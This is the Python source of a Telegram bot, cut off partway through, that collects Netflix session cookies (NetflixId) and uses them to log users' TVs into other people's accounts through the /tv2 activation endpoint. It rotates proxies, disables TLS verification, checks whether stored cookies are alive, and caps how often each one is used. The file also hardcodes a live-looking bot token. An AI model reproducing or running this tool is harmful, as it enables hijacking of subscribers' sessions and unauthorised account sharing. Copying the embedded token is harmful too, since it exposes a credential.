# @Atoniz715 Gay Maker
import asyncio
from concurrent.futures import ThreadPoolExecutor
import gzip
import io
import json
import logging
import os
import random
import re
import threading
import time
import urllib.parse
import warnings
import zipfile
from typing import Dict, List, Optional, Tuple

warnings.filterwarnings("ignore")
import pymongo
import requests
from flask import Flask
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from telegram import BotCommand, BotCommandScopeChat, Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ========== BACKGROUND FLASK WEB SERVER (FOR RENDER HEALTH CHECKS) ==========
app_flask = Flask(__name__)


@app_flask.route("/")
def home():
    return "Bot is running fine!", 200


@app_flask.route("/health")
def health():
    return {"status": "healthy"}, 200


def run_web_server():
    port = int(os.environ.get("PORT", 8000))
    app_flask.run(host="0.0.0.0", port=port)


# Start Flask in background thread
threading.Thread(target=run_web_server, daemon=True).start()

# ========== LOGGING ==========
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== RAR SUPPORT ==========
try:
    import rarfile
    RAR_SUPPORT = True
except ImportError:
    RAR_SUPPORT = False

# ========== CONFIGURATION ==========
BOT_TOKEN = "8643705076:AAE4OT07CYLCFQzJfvuET7vlBhaHGGwWeV4"  # Update with your active token from @BotFather
ADMIN_IDS = [6420446828]  # Your Telegram user IDs

REQUIRED_CHANNELS = [{
    "username": "@XeronLab",
    "invite_link": "https://t.me/XeronLab",
}]

REQUEST_TIMEOUT = 10
MAX_USAGE_PER_COOKIE = 2
MAX_COOKIES_TO_TRY = 10

# GLOBAL CANCELLATION FLAG FOR /stop
stop_requested = False

# ========== MONGODB SETUP ==========
MONGO_URI = os.environ.get("MONGO_URI")
if not MONGO_URI:
    logger.warning(
        "MONGO_URI environment variable is missing! Local fallback memory will reset on restart."
    )

mongo_client = (
    pymongo.MongoClient(
        MONGO_URI,
        tls=True,
        tlsAllowInvalidCertificates=True,
        serverSelectionTimeoutMS=5000,
    )
    if MONGO_URI
    else None
)
db = mongo_client["netflix_bot_db"] if mongo_client else None

cookies_col = db["cookies"] if db is not None else None
stats_col = db["user_stats"] if db is not None else None
channels_col = db["channels"] if db is not None else None
users_col = db["known_users"] if db is not None else None
proxies_col = db["proxies"] if db is not None else None

_local_cookies_store = {}
_local_user_stats = {}
_local_channels = []
_local_users = set()
_local_proxies = []

BASE_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like"
        " Gecko) Chrome/143.0.0.0 Safari/537.36"
    ),
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    ),
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-IN,en;q=0.8",
    "Cache-Control": "max-age=0",
    "DNT": "1",
    "Upgrade-Insecure-Requests": "1",
    "Sec-GPC": "1",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    'Sec-Ch-Ua': '"Quetta";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    'Sec-Ch-Ua-Platform': '"Linux"',
}


# ========== PROXY MANAGEMENT FUNCTIONS ==========
def parse_proxy_string(proxy_str: str) -> Optional[Dict[str, str]]:
    """Parses 'user:pass:host:port' or 'host:port:user:pass' or 'host:port'."""
    parts = proxy_str.strip().split(":")
    if len(parts) == 4:
        if "." in parts[0]:
            host, port, user, password = parts[0], parts[1], parts[2], parts[3]
        else:
            user, password, host, port = parts[0], parts[1], parts[2], parts[3]
        formatted_url = f"http://{user}:{password}@{host}:{port}"
        return {"http": formatted_url, "https": formatted_url}
    elif len(parts) == 2:
        host, port = parts[0], parts[1]
        formatted_url = f"http://{host}:{port}"
        return {"http": formatted_url, "https": formatted_url}
    return None


def test_proxy_connection(proxy_dict: Dict[str, str]) -> bool:
    try:
        r = requests.get(
            "https://api.ipify.org?format=json",
            proxies=proxy_dict,
            timeout=5,
            verify=False,
        )
        return r.status_code == 200
    except Exception:
        return False


def save_proxy_to_db(proxy_raw: str, proxy_dict: Dict[str, str]):
    if proxies_col is not None:
        proxies_col.update_one(
            {"_id": proxy_raw},
            {"$set": {"raw": proxy_raw, "formatted": proxy_dict}},
            upsert=True,
        )
    else:
        if proxy_dict not in _local_proxies:
            _local_proxies.append(proxy_dict)


def get_random_proxy() -> Optional[Dict[str, str]]:
    if proxies_col is not None:
        docs = list(proxies_col.find({}))
        if docs:
            return random.choice(docs)["formatted"]
    elif _local_proxies:
        return random.choice(_local_proxies)
    return None


async def sanitize_proxy_pool(status_msg=None) -> int:
    """Tests all stored proxies in parallel, deletes dead ones, and returns live count."""
    if proxies_col is not None:
        docs = list(proxies_col.find({}))
        if not docs:
            return 0

        if status_msg:
            try:
                await status_msg.edit_text(
                    f"🔍 **Sanitizing Proxy Pool:** Testing `{len(docs)}` saved proxies..."
                )
            except Exception:
                pass

        live_count = 0
        dead_ids = []

        def check_p(doc):
            is_ok = test_proxy_connection(doc["formatted"])
            return doc["_id"], is_ok

        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(check_p, doc) for doc in docs]
            for future in futures:
                proxy_id, is_ok = future.result()
                if is_ok:
                    live_count += 1
                else:
                    dead_ids.append(proxy_id)

        if dead_ids:
            proxies_col.delete_many({"_id": {"$in": dead_ids}})
            logger.info(
                f"Pre-flight check purged {len(dead_ids)} dead proxies from database."
            )

        return live_count
    else:
        global _local_proxies
        _local_proxies = [p for p in _local_proxies if test_proxy_connection(p)]
        return len(_local_proxies)


# ========== HELPER & USER TRACKING FUNCTIONS ==========
async def safe_reply(message, text, **kwargs):
    try:
        if message and hasattr(message, "reply_text"):
            return await message.reply_text(text, **kwargs)
    except Exception as e:
        logger.warning(f"Safe reply failed: {e}")
    return None


def register_user(user_id: int):
    if users_col is not None:
        users_col.update_one({"_id": user_id}, {"$set": {"user_id": user_id}}, upsert=True)
    else:
        _local_users.add(user_id)


def get_all_known_user_ids() -> List[int]:
    if users_col is not None:
        return [doc["_id"] for doc in users_col.find({}, {"_id": 1})]
    return list(_local_users)


# ========== MONGODB / PERSISTENCE FUNCTIONS ==========
def load_user_stats() -> Dict:
    if stats_col is not None:
        doc = stats_col.find_one({"_id": "user_stats"})
        return doc["data"] if doc else {}
    return _local_user_stats


def save_user_stats(stats: Dict):
    global _local_user_stats
    if stats_col is not None:
        stats_col.update_one(
            {"_id": "user_stats"}, {"$set": {"data": stats}}, upsert=True
        )
    else:
        _local_user_stats = stats


def increment_user_login(user_id: int):
    stats = load_user_stats()
    key = str(user_id)
    stats[key] = stats.get(key, 0) + 1
    save_user_stats(stats)


def get_user_login_count(user_id: int) -> int:
    stats = load_user_stats()
    return stats.get(str(user_id), 0)


def get_total_logins_all_users() -> int:
    stats = load_user_stats()
    return sum(stats.values())


def load_channels() -> List[int]:
    if channels_col is not None:
        doc = channels_col.find_one({"_id": "approved_channels"})
        return doc["data"] if doc else []
    return _local_channels


def load_cookies_store() -> Dict:
    if cookies_col is not None:
        doc = cookies_col.find_one({"_id": "cookies_store"})
        return doc["data"] if doc else {}
    return _local_cookies_store


def save_cookies_store(store: Dict):
    global _local_cookies_store
    if cookies_col is not None:
        cookies_col.update_one(
            {"_id": "cookies_store"}, {"$set": {"data": store}}, upsert=True
        )
    else:
        _local_cookies_store = store


def add_cookie_with_metadata(
    admin_id: int, filename: str, netflix_id: str
) -> Tuple[bool, str]:
    store = load_cookies_store()
    admin_key = str(admin_id)
    if admin_key not in store:
        store[admin_key] = []
    for entry in store[admin_key]:
        if entry.get("NetflixId") == netflix_id:
            return False, "duplicate"
    store[admin_key].append(
        {"filename": filename, "NetflixId": netflix_id, "usage_count": 0}
    )
    save_cookies_store(store)
    return True, "ok"


def get_all_cookies_with_metadata() -> List[Dict]:
    store = load_cookies_store()
    all_cookies = []
    for admin_id, entries in store.items():
        for entry in entries:
            all_cookies.append({
                "filename": entry["filename"],
                "NetflixId": entry["NetflixId"],
                "usage_count": entry.get("usage_count", 0),
                "admin_id": admin_id,
            })
    return all_cookies


def increment_cookie_usage(netflix_id: str) -> bool:
    store = load_cookies_store()
    for admin_id, entries in store.items():
        for i, entry in enumerate(entries):
            if entry.get("NetflixId") == netflix_id:
                entry["usage_count"] = entry.get("usage_count", 0) + 1
                if entry["usage_count"] >= MAX_USAGE_PER_COOKIE:
                    del entries[i]
                    save_cookies_store(store)
                    return False
                save_cookies_store(store)
                return True
    return False


def remove_cookie_by_netflixid_global(netflix_id: str) -> bool:
    store = load_cookies_store()
    removed = False
    for admin_key, entries in store.items():
        initial_len = len(entries)
        store[admin_key] = [e for e in entries if e.get("NetflixId") != netflix_id]
        if len(store[admin_key]) < initial_len:
            removed = True
    if removed:
        save_cookies_store(store)
    return removed


def get_total_remaining_uses() -> int:
    cookies = get_all_cookies_with_metadata()
    total = 0
    for c in cookies:
        remaining = MAX_USAGE_PER_COOKIE - c["usage_count"]
        if remaining > 0:
            total += remaining
    return total


def get_total_cookie_count() -> int:
    return len(get_all_cookies_with_metadata())


def delete_all_cookies() -> bool:
    save_cookies_store({})
    return True


# ========== FORCE JOIN CHECK ==========
async def check_force_join(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> bool:
    if not REQUIRED_CHANNELS:
        return True
    user_id = update.effective_user.id
    register_user(user_id)
    if user_id in ADMIN_IDS:
        return True
    not_joined = []
    for channel in REQUIRED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(channel["username"], user_id)
            if member.status not in ("member", "administrator", "creator"):
                not_joined.append(channel)
        except Exception:
            not_joined.append(channel)
    if not_joined:
        msg = "⚠️ *You must join the following channel(s) to use this bot:*\n\n"
        for ch in not_joined:
            msg += f"• [{ch['username']}]({ch['invite_link']})\n"
        msg += "\nAfter joining, send /start again."
        await safe_reply(
            update.message,
            msg,
            parse_mode="Markdown",
            disable_web_page_preview=True,
        )
        return False
    return True


# ========== COOKIE EXTRACTION & VALIDATION ==========
def extract_netflix_id_from_text(text: str) -> Optional[str]:
    match = re.search(r"netflixid\s*=\s*([^\s;]+)", text, re.IGNORECASE)
    if match:
        return match.group(1)
    for line in text.splitlines():
        line_stripped = line.strip()
        if not line_stripped:
            continue
        if line_stripped.startswith("#") and not line_stripped.startswith(
            "#HttpOnly_"
        ):
            continue
        if line_stripped.startswith("#HttpOnly_"):
            line_stripped = line_stripped[len("#HttpOnly_") :]
        parts = line_stripped.split()
        if len(parts) >= 7 and parts[5].lower() == "netflixid":
            return parts[6]
    try:
        data = json.loads(text)
        if isinstance(data, dict):
            if data.get("name") == "NetflixId":
                return data.get("value")
            data = data.get("cookies") or data.get("items") or [data]
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId":
                    return cookie.get("value")
    except Exception:
        pass
    if text.startswith("v%3D") or text.startswith("%"):
        return text
    return None


def check_if_cookie_alive(netflix_id: str) -> Tuple[bool, str]:
    session = requests.Session()
    session.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
    headers = BASE_HEADERS.copy()
    headers["Referer"] = "https://www.netflix.com/"
    proxy = get_random_proxy()

    try:
        r = session.get(
            "https://www.netflix.com/YourAccount",
            headers=headers,
            proxies=proxy,
            timeout=REQUEST_TIMEOUT,
            verify=False,
            allow_redirects=False,
        )

        if r.status_code in (301, 302, 303, 307, 308):
            redirect_target = r.headers.get("Location", "").lower()
            if "login" in redirect_target or "signup" in redirect_target:
                return False, "Dead/Expired Cookie"

        r2 = session.get(
            "https://www.netflix.com/account/membership",
            headers=headers,
            proxies=proxy,
            timeout=REQUEST_TIMEOUT,
            verify=False,
            allow_redirects=True,
        )

        if r2.status_code != 200:
            return False, f"HTTP {r2.status_code} Error"

        html = r2.text
        lower_html = html.lower()

        if "/login" in r2.url.lower() or ("sign in" in lower_html and "password" in lower_html):
            return False, "Dead/Expired Cookie"

        hold_indicators = [
            "payment on hold",
            "update your payment information",
            "membership holds",
            "hold_context",
            '"accountstatus":"hold"',
        ]
        if any(indicator in lower_html for indicator in hold_indicators):
            return False, "Payment On Hold"

        inactive_indicators = [
            "free plan",
            "no active plan",
            "restart your membership",
            '"accountstatus":"former_member"',
            '"accountstatus":"never_member"',
        ]
        if any(indicator in lower_html for indicator in inactive_indicators):
            return False, "Free/Inactive Plan"

        if "currentcountry" not in lower_html and "countryofsignup" not in lower_html:
            return False, "Invalid Account Structure"

        return True, "OK"

    except Exception as e:
        logger.warning(f"Cookie check error for {netflix_id[:15]}: {e}")
        return False, "Connection Timeout"


# ========== TV ACTIVATION USING /tv2 API ==========
def extract_auth_url_from_tv2(html: str) -> Optional[str]:
    patterns = [
        r'name="authURL"\s+value="([^"]+)"',
        r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
        r"authURL=([^&\s\"']+)",
        r'value="(c1\.[^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return None


def submit_tv_code(
    netflix_id: str, tv_code: str
) -> Tuple[bool, Optional[str], Optional[str], Optional[str], Optional[int]]:
    session = requests.Session()
    session.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
    headers = BASE_HEADERS.copy()
    headers["Referer"] = "https://www.netflix.com/tv2"
    headers["Origin"] = "https://www.netflix.com"
    proxy = get_random_proxy()

    try:
        r = session.get(
            "https://www.netflix.com/tv2",
            headers=headers,
            proxies=proxy,
            timeout=REQUEST_TIMEOUT,
            verify=False,
        )
        if r.status_code != 200:
            return (
                False,
                None,
                None,
                f"GET /tv2 returned {r.status_code}",
                r.status_code,
            )
    except Exception as e:
        return False, None, None, f"GET error: {e}", None

    auth_url = extract_auth_url_from_tv2(r.text)
    if not auth_url:
        return False, None, None, "authURL not found", r.status_code

    payload = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "isTvUrl2": "true",
        "action": "nextAction",
    }
    post_headers = headers.copy()
    post_headers["Content-Type"] = "application/x-www-form-urlencoded"

    try:
        r = session.post(
            "https://www.netflix.com/tv2",
            data=payload,
            headers=post_headers,
            proxies=proxy,
            timeout=REQUEST_TIMEOUT,
            verify=False,
            allow_redirects=True,
        )
    except Exception as e:
        return False, None, None, f"POST error: {e}", None

    final_url = r.url
    status = r.status_code

    cleaned = re.sub(r"<script[^>]*>.*?</script>", "", r.text, flags=re.DOTALL)
    cleaned = re.sub(r"<style[^>]*>.*?</style>", "", cleaned, flags=re.DOTALL)
    cleaned = re.sub(r"<[^>]+>", " ", cleaned)
    cleaned = re.sub(r"\s+", " ", cleaned).strip()

    if "/tv/out/success" in final_url:
        return True, final_url, cleaned, None, status
    lower_text = r.text.lower()
    if (
        "your tv is ready to watch" in lower_text
        or "you're ready to watch" in lower_text
    ):
        return True, final_url, cleaned, None, status
    if "that code wasn't right" in lower_text or "invalid code" in lower_text:
        return False, final_url, cleaned, "Invalid code", status
    return False, final_url, cleaned, "Unknown result", status


def fetch_page(netflix_id: str, url: str) -> Tuple[Optional[str], Optional[str]]:
    sess = requests.Session()
    sess.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
    headers = {
        "User-Agent": BASE_HEADERS["User-Agent"],
        "Accept": BASE_HEADERS["Accept"],
        "Accept-Encoding": BASE_HEADERS["Accept-Encoding"],
        "Accept-Language": BASE_HEADERS["Accept-Language"],
        "Referer": "https://www.netflix.com/",
    }
    proxy = get_random_proxy()
    try:
        r = sess.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return None, f"HTTP {r.status_code}"
        content = r.content
        if len(content) >= 2 and content[0] == 0x1F and content[1] == 0x8B:
            html = gzip.decompress(content).decode("utf-8")
        else:
            html = r.text
        return html, None
    except Exception as e:
        return None, str(e)


def get_country_and_plan(
    netflix_id: str,
) -> Tuple[Optional[str], Optional[str]]:
    html, err = fetch_page(
        netflix_id, "https://www.netflix.com/account/membership"
    )
    if err or not html:
        return None, None
    country = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', html)
    if not country:
        country = re.search(r'"countryOfSignup":\s*"([^"]+)"', html)
    if not country:
        return None, None
    m = re.search(
        r'"MemberPlan".*?"localizedPlanName".*?"value":"([^"]+)"', html, re.DOTALL
    )
    if not m:
        m = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', html)
    if not m:
        m = re.search(r'"planName"\s*:\s*"([^"]+)"', html)
    if m:
        return country.group(1), m.group(1)
    return country.group(1), "Unknown"


# ========== BOT COMMANDS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        register_user(update.effective_user.id)
        if not await check_force_join(update, context):
            return
    except Exception as e:
        logger.warning(f"Force join check failed: {e}")
    await safe_reply(
        update.message,
        "𝕎𝔼𝕃ℂ𝕆𝕄𝔼 𝕋𝕆 ℕ𝔼𝕋𝔽𝕃𝕀𝕏 𝕋𝕍 𝕃𝕆𝔾𝕀ℕ 𝔹𝕆𝕋!\n\n"
        "⚡𝗜𝗡𝗦𝗧𝗔𝗡𝗧𝗟𝗬 𝗟𝗢𝗚𝗜𝗡⚡\n⚡𝗠𝗜𝗫 𝗣𝗟𝗔𝗡 𝗟𝗢𝗚𝗜𝗡⚡\n\n"
        "𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃",
    )


async def panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        register_user(user_id)
        is_admin = user_id in ADMIN_IDS
        user_count = get_user_login_count(user_id)
        username = update.effective_user.username or "User"
        text = (
            f"📊 *Panel for {username}*\n\n✅ *Your successful logins:*"
            f" `{user_count}`"
        )
        if is_admin:
            total_logins_all = get_total_logins_all_users()
            total_cookies = get_total_cookie_count()
            remaining_uses = get_total_remaining_uses()
            text += "\n\n--- *Global Stats (Admin)* ---\n"
            text += f"🍪 *Cookies stored:* `{total_cookies}`\n"
            text += f"🔁 *Remaining uses:* `{remaining_uses}`\n"
            text += f"👥 *Total user logins:* `{total_logins_all}`"
        await safe_reply(update.message, text, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Panel error: {e}")
        await safe_reply(update.message, "❌ Could not load panel.")


async def channels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        register_user(update.effective_user.id)
        channels = load_channels()
        if not channels:
            await safe_reply(update.message, "ℹ️ No channels have been added yet.")
            return
        channel_list = []
        for cid in channels[:5]:
            try:
                chat = await context.bot.get_chat(cid)
                name = chat.title or f"Channel {cid}"
            except Exception:
                name = f"ID {cid}"
            channel_list.append(name)
        text = "📢 *Approved Channels* (first 5):\n\n" + "\n".join(
            f"• {name}" for name in channel_list
        )
        if len(channels) > 5:
            text += f"\n\n... and {len(channels)-5} more."
        await safe_reply(update.message, text, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Channels error: {e}")
        await safe_reply(update.message, "❌ Could not fetch channels.")


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_requested
    if update.effective_user.id not in ADMIN_IDS:
        await safe_reply(update.message, "⛔ Admins only.")
        return
    stop_requested = True
    await safe_reply(update.message, "🛑 **Stop signal sent!** Stopping current bulk operations...")


async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await safe_reply(update.message, "⛔ Admins only.")
        return

    args = context.args
    if not args:
        await safe_reply(
            update.message,
            "⚠️ **Usage:**\n`/addproxy user:pass:host:port`\nor\n`/addproxy host:port:user:pass`\n\nMultiple proxies can be separated by spaces.",
            parse_mode="Markdown",
        )
        return

    status_msg = await safe_reply(update.message, f"🔍 Testing `{len(args)}` proxy string(s)...")
    added, failed = 0, 0

    for proxy_str in args:
        proxy_dict = parse_proxy_string(proxy_str)
        if not proxy_dict:
            failed += 1
            continue

        is_working = await asyncio.to_thread(test_proxy_connection, proxy_dict)
        if is_working:
            save_proxy_to_db(proxy_str, proxy_dict)
            added += 1
        else:
            failed += 1

    await status_msg.edit_text(
        "✅ **Proxy Import Complete!**\n\n"
        f"🟢 **Working Added:** `{added}`\n"
        f"🔴 **Failed/Invalid:** `{failed}`",
        parse_mode="Markdown",
    )


async def listproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await safe_reply(update.message, "⛔ Admins only.")
        return

    if proxies_col is not None:
        count = proxies_col.count_documents({})
    else:
        count = len(_local_proxies)

    await safe_reply(
        update.message,
        f"🌐 **Proxy Pool Stats:**\n\nActive proxies in database: `{count}`",
        parse_mode="Markdown",
    )


async def clearproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await safe_reply(update.message, "⛔ Admins only.")
        return

    global _local_proxies
    if proxies_col is not None:
        deleted_count = proxies_col.delete_many({}).deleted_count
    else:
        deleted_count = len(_local_proxies)
        _local_proxies.clear()

    await safe_reply(
        update.message,
        f"🗑️✅ **Proxy Pool Cleared!**\n\nRemoved `{deleted_count}` proxy entry/entries from storage.",
        parse_mode="Markdown",
    )


async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        register_user(update.effective_user.id)
        if not await check_force_join(update, context):
            return
    except Exception as e:
        logger.warning(f"Force join check failed: {e}")

    args = context.args
    if not args:
        await safe_reply(
            update.message,
            "⚡𝑺𝒖𝒑𝒑𝒐𝒓𝒕𝒆𝒅 𝑭𝒐𝒓𝒎𝒂𝒕⚡\n\n"
            "/𝗹𝗼𝗴𝗶𝗻 𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴\n/𝗟𝗼𝗴𝗶𝗻 𝟭𝟮𝟯𝟰-𝟱𝟲𝟳𝟴\n\n"
            " 𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃",
        )
        return
    raw_code = args[0]
    tv_code = raw_code.replace("-", "").strip()
    if not tv_code.isdigit() or len(tv_code) < 5:
        await safe_reply(
            update.message,
            "𝗟𝗢𝗚𝗜𝗡 𝗙𝗔𝗜𝗟𝗘𝗗 𝗧𝗛𝗘 𝗖𝗢𝗗𝗘 𝗜𝗦 𝗜𝗡𝗩𝗔𝗟𝗜𝗗❌\n\n"
            "𝗦𝗨𝗣𝗣𝗢𝗥𝗧𝗘𝗗 𝗙𝗢𝗥𝗠𝗔𝗧\n/𝗟𝗼𝗴𝗶𝗻 𝟭𝟮𝟯𝟰-𝟱𝟲𝟳𝟴\n/𝗹𝗼𝗴𝗶𝗻 𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴\n\n"
            " 𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃",
        )
        return

    all_cookies = get_all_cookies_with_metadata()
    if not all_cookies:
        await safe_reply(
            update.message,
            "ℕ𝕆 ℂ𝕆𝕆𝕂𝕀𝔼𝕊 𝔸𝕍𝔸𝕀𝕃𝔸𝔹𝕃𝔼 ℂ𝕌ℝℝ𝔼ℕ𝕋𝕃𝕐!\n\n"
            "𝗣𝗹𝗲𝗮𝘀𝗲 𝗧𝗿𝘆 𝗟𝗮𝘁𝗲𝗿!\n\n"
            " 𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃",
        )
        return

    status_msg = await safe_reply(update.message, "⌛️𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐈𝐍𝐆 𝐍𝐄𝐓𝐅𝐋𝐈𝐗... ")

    valid_cookies = [
        c for c in all_cookies if c.get("usage_count", 0) < MAX_USAGE_PER_COOKIE
    ]
    random.shuffle(valid_cookies)
    cookies_to_try = valid_cookies[:MAX_COOKIES_TO_TRY]

    success = False
    for cookie_entry in cookies_to_try:
        netflix_id = cookie_entry["NetflixId"]

        ok, final_url, cleaned, err_msg, status = await asyncio.to_thread(
            submit_tv_code, netflix_id, tv_code
        )
        if ok:
            increment_cookie_usage(netflix_id)
            increment_user_login(update.effective_user.id)
            country, plan = await asyncio.to_thread(
                get_country_and_plan, netflix_id
            )
            if not country:
                country = "Unknown"
                plan = "Unknown"

            success_text = (
                "⚡𝐘𝐎𝐔𝐑 𝐓𝐕 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐋𝐎𝐆𝐆𝐄𝐃 𝐈𝐍 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘!⚡\n\n"
                f"ℂ𝕆𝕌ℕ𝕋ℝ𝕐:❮{country.upper()}❯     ┃  "
                f" ℙ𝕃𝔸ℕ:❮{plan.upper()}❯\n\n"
                "𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃"
            )

            if status_msg:
                try:
                    await status_msg.edit_text(success_text)
                except Exception:
                    await safe_reply(update.message, success_text)
            else:
                await safe_reply(update.message, success_text)

            success = True
            break
        else:
            logger.warning(
                f"Activation failed for {cookie_entry['filename']}: {err_msg}"
            )

    if not success:
        fail_text = (
            "𝗟𝗢𝗚𝗜𝗡 𝗙𝗔𝗜𝗟𝗘𝗗 𝗧𝗛𝗘 𝗖𝗢𝗗𝗘 𝗜𝗦 𝗜𝗡𝗩𝗔𝗟𝗜𝗗❌\n\n"
            "𝗦𝗨𝗣𝗣𝗢𝗥𝗧𝗘𝗗 𝗙𝗢𝗥𝗠𝗔𝗧\n/𝗟𝗼𝗴𝗶𝗻 𝟭𝟮𝟯𝟰-𝟱𝟲𝟳𝟴\n/𝗹𝗼𝗴𝗶𝗻 𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴\n\n"
            " 𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃"
        )
        if status_msg:
            try:
                await status_msg.edit_text(fail_text)
            except Exception:
                await safe_reply(update.message, fail_text)
        else:
            await safe_reply(update.message, fail_text)


# ========== ADMIN /RECHECK COMMAND ==========
async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_requested
    if update.effective_user.id not in ADMIN_IDS:
        await safe_reply(update.message, "⛔ Admins only.")
        return

    stop_requested = False
    all_users = get_all_known_user_ids()
    maintenance_notice = "⚠️𝖧𝖮𝖴𝖱𝖫𝖸 𝖵𝖠𝖴𝖫𝖳 𝖬𝖠𝖨𝖭𝖳𝖤𝖭𝖠𝖭𝖢𝖤"

    await safe_reply(update.message, f"📢 Broadcasting maintenance alert to {len(all_users)} users...")

    success_broadcast = 0
    for uid in all_users:
        if stop_requested:
            break
        try:
            await context.bot.send_message(chat_id=uid, text=maintenance_notice)
            success_broadcast += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass

    status_msg = await safe_reply(
        update.message,
        f"🔄 **Vault Maintenance Started**\n\nAlert sent to `{success_broadcast}` users.\nChecking database cookies...",
        parse_mode="Markdown"
    )

    all_cookies = get_all_cookies_with_metadata()
    if not all_cookies:
        await status_msg.edit_text("📭 Database is empty. No cookies to recheck.")
        return

    total = len(all_cookies)
    removed_count = 0
    retained_count = 0
    checked = 0
    last_edit_time = time.time()

    def check_task(cookie_entry):
        if stop_requested:
            return cookie_entry, None, "Stopped"
        netflix_id = cookie_entry["NetflixId"]
        is_alive, reason = check_if_cookie_alive(netflix_id)
        return cookie_entry, is_alive, reason

    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = [executor.submit(check_task, c) for c in all_cookies]
        for future in futures:
            if stop_requested:
                executor.shutdown(wait=False, cancel_futures=True)
                break
            entry, is_alive, reason = future.result()
            checked += 1

            if is_alive is False:
                remove_cookie_by_netflixid_global(entry["NetflixId"])
                removed_count += 1
                logger.info(f"Recheck purged {entry['filename']}: {reason}")
            elif is_alive is True:
                retained_count += 1

            current_time = time.time()
            if (current_time - last_edit_time >= 1.5) or (checked == total):
                try:
                    await status_msg.edit_text(
                        f"🔄 **Vault Maintenance Progress:** `{checked}/{total}`\n\n"
                        f"🟢 **Alive Retained:** `{retained_count}`\n"
                        f"🔴 **Dead Removed:** `{removed_count}`",
                        parse_mode="Markdown"
                    )
                    last_edit_time = current_time
                except Exception:
                    pass

    status_prefix = "🛑 **Vault Maintenance Stopped!**" if stop_requested else "✅ **Vault Maintenance Completed!**"
    await status_msg.edit_text(
        f"{status_prefix}\n\n"
        f"👥 **Users Notified:** `{success_broadcast}`\n"
        f"🟢 **Alive Cookies Retained:** `{retained_count}`\n"
        f"🗑️ **Dead Cookies Cleaned:** `{removed_count}`",
        parse_mode="Markdown"
    )


# ========== OTHER ADMIN COMMANDS ==========
async def delall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await safe_reply(update.message, "⛔ Admins only.")
        return
    await safe_reply(
        update.message,
        "⚠️ Are you sure you want to DELETE ALL cookies? Send `/delall_confirm` to proceed.",
        parse_mode="Markdown",
    )


async def delall_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    if delete_all_cookies():
        await safe_reply(update.message, "🗑️✅ All cookies have been deleted.")
    else:
        await safe_reply(update.message, "ℹ️ No cookies were present.")


async def list_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
